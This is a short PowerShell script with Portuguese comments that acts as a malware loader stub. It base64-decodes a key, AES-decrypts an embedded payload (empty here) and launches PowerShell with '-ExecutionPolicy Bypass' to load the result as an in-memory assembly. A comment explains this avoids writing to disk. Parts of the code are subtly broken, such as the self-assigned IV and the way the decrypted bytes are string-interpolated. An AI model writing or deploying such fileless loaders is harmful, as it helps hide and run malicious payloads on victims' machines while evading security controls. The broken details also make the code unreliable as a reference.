
    function d1($input) {
        return [System.Convert]::FromBase64String($input)
    }

    function d2($eBytes, $key) {
        $aes = New-Object System.Security.Cryptography.AesManaged
        $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($key)
        $aes.IV = $aes.IV
        $decryptor = $aes.CreateDecryptor()
        $memoryStream = New-Object System.IO.MemoryStream($eBytes)
        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
        $decryptedBytes = New-Object byte[]($eBytes.Length)
        $cryptoStream.Read($decryptedBytes, 0, $decryptedBytes.Length) | Out-Null
        $memoryStream.Close()
        $cryptoStream.Close()
        return $decryptedBytes
    }

    $k = 'UE9laFNNT3draDRtcXhOMHlkSGluQXFhZjFVLVpudFROZkFfQnFON210VT0='
    $b = ''
    
    # Descriptografa a chave e os bytes
    $key = [System.Text.Encoding]::UTF8.GetString(d1($k))
    $eBytes = d1($b)
    $dBytes = d2 $eBytes $key

    # Executa diretamente os bytes na memória sem salvar no disco
    $proc = New-Object System.Diagnostics.Process
    $proc.StartInfo.FileName = 'powershell'
    $proc.StartInfo.Arguments = '-ExecutionPolicy Bypass -Command "[System.Reflection.Assembly]::Load((New-Object System.Text.UTF8Encoding).GetBytes($dBytes))"'
    $proc.Start()
    
